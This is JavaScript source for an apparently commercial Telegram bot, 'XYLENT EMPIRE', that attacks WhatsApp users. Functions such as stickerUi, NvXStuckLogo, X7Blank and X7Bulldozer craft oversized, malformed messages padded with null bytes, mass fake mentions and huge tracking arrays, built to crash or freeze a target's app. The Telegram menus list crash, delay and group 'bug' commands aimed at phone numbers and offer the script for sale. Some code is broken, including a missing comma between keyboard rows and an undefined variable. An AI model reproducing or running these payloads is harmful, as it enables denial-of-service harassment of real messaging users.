          "tower_number":"𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
          "city":"𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
          "name":"pinzyX7",
          "phone_number":"999999999999",
          "house_number":"13135550002",
          "floor_number":"@3135550202",
          "state":"X${"\u0000".repeat(900000)}"}}`,
          version: 3
        },
        startTime: "1764032400",
        extraGuestsAllowed: true,
        isScheduleCall: true
      }
    },
    { participant: { jid: target } }
  );
}
}

async function DelayTrackingHard(sock, groupJid) {
await sock.relayMessage(groupJid, {
   groupStatusMessageV2: {
      message: {
       interactiveResponseMessage: {
         contextInfo: {
           urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 100000 }, () => ({})),
          },
          body: {
            text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 𝖠𝗇𝗍𝗂 𝖠𝗆𝗉𝗈𝗌"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(9999099),
            version: 3
          },
        }
       }
      }
    }
  }, { participant: { jid: targetJid } });

  console.log("𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 𝖫𝗈𝖼𝗄 𝖸𝗈𝗎: " + groupJid);
}

async function button(sock, target) {
  try {
    const msg = await generateWAMessageFromContent(
      target,
      {
        buttonsMessage: {
          text: "#𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
          contentText: "#𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄" + "ꦾ".repeat(15000),
          footerText: "ꦾ".repeat(30000),
          buttons: [
            {
              buttonId: "X",
              buttonText: {
                displayText: "\u0000".repeat(50000)
              },
              type: 1
            }
          ],
          headerType: 1,
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () => 
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
            isForwarded: true,
            forwardingScore: 99,
            participant: target,
            remoteJid: "0@s.whatsapp.net",
            externalAdReply: {
              title: "\x10".repeat(5000),
              body: "\x10".repeat(5000),
              thumbnailUrl: null,
              sourceUrl: "https://Wa.me/stickerpack/settings",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      },
      { userJid: target }
    );

    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });

  } catch (err) {
    console.error(err);
  }
}

async function stickerUi(sock, target) {
  try {
    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            stickerPackMessage: {
              stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
              name: "ꦽ".repeat(50000) + "\u0000".repeat(10000),
              publisher: "ꦽ".repeat(50000) + "\u0000".repeat(10000),
              caption: "ꦽ".repeat(50000) + "\u0000".repeat(10000),

              stickers: [
                ...Array.from({ length: 4700 }, () => ({
                  fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                  isAnimated: false,
                  emojis: ["🦠", "🩸", "☠️", "💥"],
                  accessibilityLabel: "",
                  stickerSentTs: "#𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
                  isAvatar: true,
                  isAiSticker: true,
                  isLottie: true,
                  mimetype: "application/pdf"
                }))
              ],

              fileLength: "1073741824000",
              fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
              fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
              mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
              directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4",

              contextInfo: {
                remoteJid: "0@s.whatsapp.net",
                participant: target,
                stanzaId: "1234567890ABCDEF",
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1990 }, () =>
                    `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                  )
                ],
                quotedMessage: {
                  locationMessage: {
                    degreesLongitude: 9999,
                    degreesLatitude: 9999,
                    name: "#𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
                    url: "https://Wa.me/stickerpack" + "ꦽ".repeat(10000),
                    address: "#𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄"
                  }
                }
              },

              mediaKeyTimestamp: "1747502082",
              trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
              thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4",
              thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
              thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
              thumbnailHeight: 252,
              thumbnailWidth: 252,
              imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
              stickerPackSize: "999999999",
              stickerPackOrigin: "USER_CREATED"
            }
          }
        }
      },
      { userJid: target }
    );
    
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
  } catch (err) {
    console.error(err);
  }
}

async function NvXStuckLogo(sock, target) {
  try {
    const NvXAsep = {
      viewOnceMessage: {
        message: {
          newsletterAdminInviteMessage: {
             newsletterJid: "123456789@newsletter",
             inviteCode: "𑜦𑜠".repeat(120000),
             inviteExpiration: 99999999999,
             newsletterName: "ោ៝" + "ꦾ".repeat(250000),
             body: {
                 text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄" + "ી".repeat(250000)
                }
             }
          }
       }
    };

    await sock.relayMessage(target, NvXAsep, { participant: { jid: target } });
  } catch (e) {
    console.log("❌ Error Bng:", e.message || e);
  }
}

async function X7Blank(target) {
  const ButtonsX = [];

  for (let i = 0; i < 25; i++) {
    ButtonsX.push({
      buttonId: "cta_copy",
      buttonText: {
        displayText: "ꦽ".repeat(5000),
      },
      type: 4,
      nativeFlowInfo: {
        name: "single_select",
        paramsJson: JSON.stringify({
          title: "ꦽ".repeat(5000),
          sections: [
            {
              title: "Pinzy𝖷𝟩",
              highlight_label: "label",
              rows: [],
            },
          ],
        }),
      },
    });
  }

  await sock.sendMessage(
    target,
    {
      text: "ꦽ".repeat(25000),
      footer: "Pinzy𝖷𝟩" + "ꦽ".repeat(25000) + "ោ៝".repeat(20000),
      viewOnce: true,
      buttons: ButtonsX,
      headerType: 1,
      contextInfo: {
        participant: target,
        mentionedJid: [
          "131338822@s.whatsapp.net",
          ...Array.from(
            { length: 40000 },
            () =>
              "1" +
              Math.floor(Math.random() * 5000000) +
              "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000,
          },
        },
        businessMessageForwardInfo: {
          businessOwnerJid: target,
        },
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
      participant: { jid: target },
    }
  );
}


const mediaData = [
  {
    ID: "68917910",
    uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
    buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
    mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
  },
  {
    ID: "68884987",
    uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
    buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
    mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
  },
];

let sequentialIndex = 0;

async function X7Bulldozer(sock, target) {
  try {
   const selectedMedia = mediaData[sequentialIndex];

  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const MD_ID = selectedMedia.ID;
  const MD_Uri = selectedMedia.uri;
  const MD_Buffer = selectedMedia.buffer;
  const MD_SID = selectedMedia.sid;
  const MD_sha256 = selectedMedia.SHA256;
  const MD_encsha25 = selectedMedia.ENCSHA256;
  const mkey = selectedMedia.mkey;

  let parse = true;
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
          fileSha256: MD_sha256,
          fileEncSha256: MD_encsha25,
          mediaKey: mkey,
          mimetype: type,
          directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            urlTrackingMap: {
               urlTrackingMapElements: Array.from(
                 { length: 500000 },
                 () => ({ "\0": "\0" })
               )
            }, 
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };
  
  let message1 = {
    interactiveResponseMessage: {
      body: {
        text: "𝖡𝗒: pinzyX7", 
        format: "DEFAULT"
      }, 
      nativeFlowResponseMessage: {
        name: "call_permission_request", 
        paramsJson: "\u0000".repeat(1045000), 
        version: 3
      }, 
      contextInfo: {
        remoteJid: "status@broadcast", 
        isGroupStatus: true, 
        urlTrackingMap: {
         urlTrackingMapElements: Array.from(
            { length: 500000 },
            () => ({ "\0": "\0" })
          )
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, message, {});
  const msg1 = generateWAMessageFromContent(target, message1, {});
  await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id, statusJidList: [target], additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: target }, content: undefined
          }]
        }]
      }]
    });
   await sock.relayMessage(target, {
     groupStatusMessageV2: {
       message: msg1.message
     }
   }, {
    messageId: msg.key.id, 
    participant: { jid: target }
   });
  } catch (err) {
    console.log(err);
  }
}
//------------------------------------------------------------------------------------------------------------------------------\\
//------------------------------------------------------------------------------------------------------------------------------\\

// NGAPAIN DI MT MANAGER BG 🤔

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
const bugRequests = {};
const userButtonColor = {};
// 1. Fungsi untuk mengambil style secara acak
// Map untuk menampung interval agar bisa dihentikan saat pesan dihapus
const buttonIntervals = new Map();
const userState = new Map();

// Handler Menu Utama supaya bisa dipanggil di /start dan back_to_main
async function sendStartMenu(chatId, from) {

  const userId = from.id
  const randomImage = getRandomImage()

  const runtimeStatus = formatRuntime()
  const memoryStatus = formatMemory()

  const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE"
  const botNumber = sessions.size

  const chosenColor = userButtonColor[userId] || "primary"
  const safeColor = userButtonColor[userId] || "primary"

  let styles

  if (chosenColor === "disco") {
     styles = ["primary", "danger", "success"]
  }

  else {

    const safeColor = {
      danger: "danger",
      success: "success",
      secondary: "primary" 
    }

    styles = [ safeColor[chosenColor] || "primary" ]
  }

  let index = 0

  let keyboard = [
    [
      {
        text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
        callback_data: "trashmenu",
        style: styles[index],
        icon_custom_emoji_id: "6219549292458150316"
      },
      { text: "XSETTINGS", callback_data: "developer_menu", style: styles[index] }
    ],
    [
      { text: "TOOLS", callback_data: "tols", style: styles[index] },
            {
  text: "Developer",
  url: "https://t.me/Pinnxzy",
  style: styles[index],
  icon_custom_emoji_id: "5260535596941582167"
}
    ]
    [
            { text: "Thanks To", callback_data: "tqto", style: styles[index] },
            { text: "Buy Script", callback_data: "buysc", style: styles[index] }
            
    ],
    [
            { text: "Update Script", callback_data: "updatesc", style: styles[index] }
            
          ]
  ]

  if (chosenColor === "disco") {

    keyboard = [
      [
        {
        text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
        callback_data: "trashmenu",
        style: styles[index],
        icon_custom_emoji_id: "6219549292458150316"
      },
      { text: "XSETTINGS", callback_data: "developer_menu", style: styles[index] }
    ],
    [
      { text: "TOOLS", callback_data: "tols", style: styles[index] },
            {
  text: "Developer",
  url: "https://t.me/Pinnxzy",
  style: styles[index],
  icon_custom_emoji_id: "5260535596941582167"
}
      ],
      [
            { text: "Thanks To", callback_data: "tqto", style: styles[index] },
            { text: "Buy Script", callback_data: "buysc", style: styles[index] }
            
          ],
          [
            { text: "Update Script", callback_data: "updatesc", style: styles[index] }
            
          ]
    ]

  }
  
  if (safeColor === "danger") {

    keyboard = [
      [
        {
        text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
        callback_data: "trashmenu",
        style: styles[index],
        icon_custom_emoji_id: "6219549292458150316"
      },
      { text: "XSETTINGS", callback_data: "developer_menu", style: styles[index] }
    ],
    [
      { text: "TOOLS", callback_data: "tols", style: styles[index] },
            {
  text: "Developer",
  url: "https://t.me/Pinnxzy",
  style: styles[index],
  icon_custom_emoji_id: "5260535596941582167"
}
      ],
      [
            { text: "Thanks To", callback_data: "tqto", style: styles[index] },
            { text: "Buy Script", callback_data: "buysc", style: styles[index] }
            
          ],
          [
            { text: "Update Script", callback_data: "updatesc", style: styles[index] }
            
          ]
    ]

  }
  
  if (safeColor === "success") {

    keyboard = [
      [
        {
        text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
        callback_data: "trashmenu",
        style: styles[index],
        icon_custom_emoji_id: "6219549292458150316"
      },
      { text: "XSETTINGS", callback_data: "developer_menu", style: styles[index] }
    ],
    [
      { text: "TOOLS", callback_data: "tols", style: styles[index] },
            {
  text: "Developer",
  url: "https://t.me/Pinnxzy",
  style: styles[index],
  icon_custom_emoji_id: "5260535596941582167"
}
      ],
      [
            { text: "Thanks To", callback_data: "tqto", style: styles[index] },
            { text: "Buy Script", callback_data: "buysc", style: styles[index] }
            
          ],
          [
            { text: "Update Script", callback_data: "updatesc", style: styles[index] }
            
          ]
    ]

  }
  
  if (safeColor === "primary") {

    keyboard = [
      [
        {
        text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
        callback_data: "trashmenu",
        style: styles[index],
        icon_custom_emoji_id: "6219549292458150316"
      },
      { text: "XSETTINGS", callback_data: "developer_menu", style: styles[index] }
    ],
    [
      { text: "TOOLS", callback_data: "tols", style: styles[index] },
            {
  text: "Developer",
  url: "https://t.me/Pinnxzy",
  style: styles[index],
  icon_custom_emoji_id: "5260535596941582167"
}
      ],
      [
            { text: "Thanks To", callback_data: "tqto", style: styles[index] },
            { text: "Buy Script", callback_data: "buysc", style: styles[index] }
            
          ],
          [
            { text: "Update Script", callback_data: "updatesc", style: styles[index] }
            
          ]
    ]

  }

  const sent = await bot.sendPhoto(chatId, randomImage, {

    caption: `
<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
⎔ Type Script: Bebas spam bugs & No Spam

<blockquote><strong>𝐒𝐄𝐍𝐃𝐄𝐑 𝐒𝐓𝐀𝐓𝐔𝐒</strong></blockquote>
⎔ 𝗦𝘁𝗮𝘁𝘂𝘀 : ${status}
⎔ 𝗡𝘂𝗺𝗯𝗲𝗿 : ${botNumber}
⎔ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲: ${runtimeStatus}
⎔ 𝗠𝗲𝗺𝗼𝗿𝘆: ${memoryStatus}
`,

    parse_mode: "HTML",

    reply_markup: {
      inline_keyboard: keyboard
    }

  })

  const messageId = sent.message_id

  if (styles.length > 1) {

    const intervalId = setInterval(async () => {

      index++
      if (index >= styles.length) index = 0

      let newKeyboard

      if (chosenColor === "disco") {

        newKeyboard = [
          [
            {
        text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
        callback_data: "trashmenu",
        style: styles[index],
        icon_custom_emoji_id: "6219549292458150316"
      },
      { text: "XSETTINGS", callback_data: "developer_menu", style: styles[index] }
    ],
    [
      { text: "TOOLS", callback_data: "tols", style: styles[index] },
      {
  text: "Developer",
  url: "https://t.me/Pinnxzy",
  style: styles[index],
  icon_custom_emoji_id: "5260535596941582167"
}
          ],
          [
            { text: "Thanks To", callback_data: "tqto", style: styles[index] },
            { text: "Buy Script", callback_data: "buysc", style: styles[index] }
            
          ],
          [
            { text: "Update Script", callback_data: "updatesc", style: styles[index] }
            
          ]
        ]

      } else {

        newKeyboard = [
          [
            {
              text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
              callback_data: "trashmenu",
              style: styles[index],
              icon_custom_emoji_id: "6219549292458150316"
            },
            { text: "XSETTINGS", callback_data: "developer_menu", style: styles[index] }
          ],
          [
            { text: "TOOLS", callback_data: "tols", style: styles[index] },
            {
  text: "Developer",
  url: "https://t.me/Pinnxzy",
  style: styles[index],
  icon_custom_emoji_id: "5260535596941582167"
}
          ],
          [
            { text: "Thanks To", callback_data: "tqto", style: styles[index] },
            { text: "Buy Script", callback_data: "buysc", style: styles[index] }
            
          ],
          [
            { text: "Update Script", callback_data: "updatesc", style: styles[index] }
            
          ]
        ]

      }

      try {

        await bot.editMessageReplyMarkup(
          { inline_keyboard: newKeyboard },
          {
            chat_id: chatId,
            message_id: messageId
          }
        )

      } catch (e) {}

    }, 2000)

    buttonIntervals.set(messageId, intervalId)

  }

}


// Handler Utama
bot.onText(/\/start/, async (msg) => {

const chatId = msg.chat.id
const from = msg.from
const userId = from.id
const firstName = msg.from.first_name || "User"
const randomImage = getRandomImage();

try {

await bot.sendPhoto(
  chatId,
  randomImage,
  {
    caption: `
<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━
( 👁️ ) Holla ${firstName}
Selamat datang di 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6165775219580472827">☠</tg-emoji> 1Gen3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji> Owner @Pinnxzy
Gunakan bot ini dengan bijak, tekan tombol di bawah untuk membuka menu utama.

 👑 𝗣𝗲𝗻𝗱𝗶𝗿𝗶 : @Pinnxzy<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
 🏆 𝗢𝘄𝗻𝗲𝗿 : @kanotdevx<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
 🏆 𝗢𝘄𝗻𝗲𝗿 : @SBErsstore1<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
 🏆 𝗠𝘆 𝗙𝗿𝗶𝗲𝗻𝗱 : @NexiRajaIblis<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
</b></blockquote>

<blockquote>☰ NOTE: The Button Mode</blockquote>
`,
    parse_mode:"HTML",
    reply_markup:{
      inline_keyboard:[
        [
          { text:"🔴 Merah", callback_data:"color_danger" },
          { text:"🟢 Hijau", callback_data:"color_success" }
        ],
        [
          { text:"🔵 Biru", callback_data:"color_primary" }, 
          { text:"🪩 Disko", callback_data:"color_disco" }
        ]
      ]
    }
  }
)

} catch(err) {
console.log("START ERROR:", err)
}

})

bot.on("callback_query", async (query) => {

  if (!query.message) return

  const chatId = query.message.chat.id
  const userId = query.from.id
  const messageId = query.message.message_id
  const data = query.data


  if (buttonIntervals.has(messageId)) {

    clearInterval(buttonIntervals.get(messageId))
    buttonIntervals.delete(messageId)

  }


  if (data.startsWith("color_")) {

    const color = data.replace("color_","")

    userButtonColor[userId] = color

    await bot.answerCallbackQuery(query.id,{
      text:"🎨 Warna dipilih"
    })

    await bot.deleteMessage(chatId,messageId).catch(()=>{})

    await sendStartMenu(chatId, query.from)

    return

  }

    await bot.deleteMessage(chatId,messageId).catch(()=>{})


    let caption = ""
    let replyMarkup = {}

    if (data === "trashmenu") {
      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu bugs
      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
⎔ type script : Bebas spam bugs & No Spam

╔─═⊱ DELAY TYPE
│/Trolling - 628xx
│/Novaria - 628xx
│/Nebula - 628xx
│/Supernova - 628xx
│/Ovalium - 628xx
│/Slowness - 628xx
│/Zombiee - 628xx
┗━━━━━━━━━━━━━━━⬡
`;
      replyMarkup = {
  inline_keyboard: [
    [{ text: "Blank Type", callback_data: "blankbug", icon_custom_emoji_id: "6097881360112816903", style: "primary" }],
    [{ text: " ⎋メインコース", callback_data: "back_to_main", icon_custom_emoji_id: "6039539366177541657", style: "primary" }]],
    };
  }  

    
    else if (data === "blankbug") {
      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
⎔ ⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
⎔ type script : bebas spam bugs & no spam

╔─═⊱ BLANK & SYSTEM UI TYPE
│/Dior - 628xx
│/Darkness - 628xx
│/Xiosr - 628xx
┗━━━━━━━━━━━━━━━⬡
`;
      replyMarkup = {
  inline_keyboard: [
    [{ text: "  Crash Type", callback_data: "crashbug", icon_custom_emoji_id: "6097881360112816903", style: "danger" }],
    [{ text: "⎋メインコース", callback_data: "back_to_main", icon_custom_emoji_id: "6039539366177541657", style: "danger" }]],
    };
  }  

    
    else if (data === "crashbug") {
      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
⎔ type script : bebas spam bugs & no spam

╔─═⊱ CRASH TYPE
│/Catally - 628xx 
│/Craryz - 628xx
│/Crazzy - 628xx
│/zombies - 628xx
┗━━━━━━━━━━━━━━━⬡
`;
      replyMarkup = {
  inline_keyboard: [
    [{ text: "  Group Bug", callback_data: "groupbug", icon_custom_emoji_id: "6097881360112816903", style: "success" }],
    [{ text: " ⎋メインコース", callback_data: "back_to_main",  icon_custom_emoji_id: "6039539366177541657", style: "success" }]],
    };
  }  

    
    else if (data === "groupbug") {
      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
⎔ type script : bebas spam bugs & no spam

╔─═⊱ GROUP TYPE
│/Cursed - 628xx
┗━━━━━━━━━━━━━━━⬡
`;
      replyMarkup = {
  inline_keyboard: [
    [{ text: "  Test Function", callback_data: "tesfunc", icon_custom_emoji_id: "6097881360112816903", style: "primary" }],
    [{ text: " ⎋メインコース", callback_data: "back_to_main",  icon_custom_emoji_id: "6039539366177541657", style: "primary" }]],
    };
  }  

    
    else if (data === "tesfunc") {
      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
⎔ type script : bebas spam bugs & no spam

╔─═⊱ Tes Function 
│/testfunc - 628xx 10
│/testgb - linkgb  10
┗━━━━━━━━━━━━━━━⬡
`;
      replyMarkup = {
        inline_keyboard: [[{ text: " ⎋メインコース", callback_data: "back_to_main",  icon_custom_emoji_id: "6039539366177541657", style : "primary" }]],
      };
    } 
    
    
    else if (data === "developer_menu") {
      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu owner
      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
⎔ type script : Bebas spam bugs & No Spam

<blockquote><strong>╔─═⊱ AKSES DEVELOPER</strong></blockquote>
│/addowner 
║/delowner 
│/addadmin 
║/deladmin 
│/addprem 
║/delprem
│/setcd 
║/addsender
│/listbot
┗━━━━━━━━━━━━━━⬡
`;
      replyMarkup = {
  inline_keyboard: [
    [{ text: "  Owner Menu", callback_data: "owner_menu", icon_custom_emoji_id: "5084974483685507801", style: "danger" }],
    [{ text: " ⎋メインコース", callback_data: "back_to_main", icon_custom_emoji_id: "6039539366177541657", style: "danger" }]],
    };
  }  
